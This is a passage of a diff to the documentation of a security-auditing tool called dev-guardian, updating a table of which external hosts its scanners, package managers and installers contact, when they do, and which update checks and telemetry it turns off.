5xx, a 429, a refusal, a transport error) is skipped in silence; dev-guardian reports it as unknown, never as unsigned or rejected — so too a referrer the log never shows fetched, and a log cut at its size cap. A bundle answered 200 whose body then breaks mid-transfer reads exactly like one that does not parse: an existence check downloads once more and, still without it, reports unknown; a verification, after its own re-run, rejects — and says the bundle was listed and served but cosign could not use it, not a bundle it can parse or a transfer that failed mid-body, to re-run if the registry was unstable. On a registry with no referrers API, the `sha256-<hex>` fallback tag that stands in for the index is written by whoever can push, not by the registry, and cosign is silent about anything there it cannot use: a tag the registry served that holds no index cosign reads, or an entry of it cosign never fetched, is nothing attached (it is read as go-containerregistry reads it, so what cosign did fetch from it is judged like any referrer); only the registry failing to serve the tag withholds. (2) A referrers API answering with no OCI index at all — an HTML 200, a 400, a 406 — is read by go-containerregistry as "no referrers API", and every signature and attestation attached as a referrer silently disappears — a signed image then reads unsigned (an existence check says absent; a verification reports a high "no signature" finding). No request fails, so neither cosign nor dev-guardian can report it. (An index served with a Content-Type other than exactly the OCI index type, which go-containerregistry ignores the same way, is seen: its body is in the log, and what it lists cosign never fetched is unknown.) |
-| Maven Central | Trivy, for a `pom.xml` (in the tools above) | when it resolves Maven dependencies |
-| Package registries, through the package managers | `deps_audit` (`npm audit`; `pip-audit`, which installs the requirements into a temporary virtualenv from PyPI), `deps_update_plan` (`npm outdated`, `composer outdated`, `bundle outdated`, `go list -m -u`, `cargo outdated`), `create_fix_pr` (installs in its worktree with `--ignore-scripts` / `--no-scripts`) | per call |
-| The project's own test command and whatever it fetches | `create_fix_pr` runs `npm test`, `pytest`, `cargo test` or `go test ./...` in its worktrees (`cargo` and `go` download the project's dependencies; `npm ci --ignore-scripts` runs first when there is a lock file) | only for a candidate fix, dry runs included |
+| Maven Central | Trivy, for a `pom.xml` (in the tools above, and `compliance_check`'s license scan) | when it resolves Maven dependencies — **even with `local_only: true`** under `audit_executive`; Trivy's `--offline-scan`, which dev-guardian does not pass, stops it |
+| Trivy's version check and anonymous usage telemetry (`check.trivy.dev`) | **disabled by dev-guardian**: every Trivy run gets `TRIVY_SKIP_VERSION_CHECK=true` and `TRIVY_DISABLE_TELEMETRY=true`, and a Trivy 0.63.0 or newer also `--skip-version-check --disable-telemetry` (`mcp/src/runners/trivyRun.ts`; `init_project`'s status script sets the two variables) | never. Measured through a refusing proxy on 0.69.3: only both settings together stop the request; each alone does not. Trivy before 0.63.0 has neither the check nor the flags. |
+| Package registries, through the package managers | `deps_audit` and `audit_executive`, which runs it (`npm audit`; `pip-audit`, which installs the requirements into a temporary virtualenv from PyPI, or from the index a requirements file names — named on the run) — **even with `local_only: true`**, `deps_update_plan` (`npm outdated`, `composer outdated`, `bundle outdated`, `go list -m -u`, `cargo outdated`), `create_fix_pr` (installs in its worktree with `--ignore-scripts` / `--no-scripts`) | per call |
+| The project's own test command and whatever it fetches | `create_fix_pr` runs `npm test`, `pytest`, `cargo test` or `go test ./...` in its worktrees — the project's own code, with an allowlisted environment that carries no token or credential of the server's (see [Hardening posture](#hardening-posture)) — (`cargo` and `go` download the project's dependencies; `npm ci --ignore-scripts` runs first when there is a lock file) | only for a candidate fix, dry runs included |
 | nuclei's update check and templates | `scan_dast` with `use_nuclei` | nuclei's own automatic update check and template download are on by default; dev-guardian does not pass `-disable-update-check` |
-| Syft's update check (Anchore) | `generate_sbom` | Syft's `check-for-app-update` defaults to true; `SYFT_CHECK_FOR_APP_UPDATE=false` in the server's environment turns it off |
+| Syft's update check (`toolbox-data.anchore.io`) | **disabled by dev-guardian**: every Syft run gets `SYFT_CHECK_FOR_APP_UPDATE=false`, and `-c` pointing at an empty file, so a repository's `.syft.yaml` cannot turn on Syft's network lookups either (`mcp/src/runners/syftRun.ts`) | never |
 | The GitHub API | `scan_iac`'s zizmor, when a GitHub token (`GH_TOKEN`) is in the server's environment | zizmor's online audits; without a token it runs offline |
 | WPScan API, and the site itself | `wp_vuln_check` (through the `wpscan` CLI) | per call |
+| WPScan's database (`data.wpscan.org`) | `wp_vuln_check` runs `wpscan --update` | only when WPScan reports its local database missing (`scan_aborted: Update required`), once per call, then the scan runs again; never with `GUARDIAN_OFFLINE=1` (the scan is then failed, naming `wpscan --update`). An existing database is never refreshed: scans pass `--no-update`. |
 | `api.wordpress.org` | `wp_audit`, `bulk_audit_wordpress_sites` (WP-CLI `verify-checksums`) | per call |
 | The target you name | `perf_check` (Lighthouse URL, k6 script) | per call |
 | GitHub, through `gh` and `git` | `create_github_issues`, `create_fix_pr` with `apply: true` | only when asked; dry runs push nothing |
-| Package managers and install scripts (winget, scoop, choco, apt, brew, pipx, npm, uv, cargo, go, curl from GitHub releases) | `install_toolchain` | only when asked; `dry_run` prints the commands |
+| Package managers and install scripts (winget, scoop, choco, apt, brew, pipx, npm, uv, cargo, go; `curl` and PowerShell's `Invoke-WebRequest` for pinned GitHub release archives) | `install_toolchain` | only when asked; `dry_run` prints the commands. Syft, Trivy, gitleaks and cosign are pinned to one release and sha256-checked before they are unpacked (see "Hardening posture") |
 | The dev-guardian repository (`git ls-remote`) | `dev-guardian ci-init` | only when the release tag is not in the local checkout |
 | Sigstore (Fulcio, Rekor — or GitHub's own Sigstore instance for a private repository) and GitHub's attestations API | the pipeline `dev-guardian ci-init github --attest` generates, from your CI runner — `ci-init` itself contacts neither | on a push, in the generated `attest` job only: it signs a build-provenance attestation of the two report files with the job's OIDC identity. Only that job holds `id-token: write`. |
 | Whatever a started MCP server contacts | `audit_mcp_tools`, for each stdio server named in `servers` | per call; the server runs until its listing is read, then its process tree is killed |
 
 `map_attack_surface` itself sends nothing, but the Semgrep it runs does what
-the rows above say: its version check, and metrics when you are logged in. The
+the rows above say: metrics when you are logged in (its version check is off). The
 hooks' SessionStart and secret-warning branches, `detect_stack`,
 `audit_agent_config`, `observability_setup`, the `status` and `dashboard` CLI
 commands and the history readers (`diff_scans`, `set_baseline`,
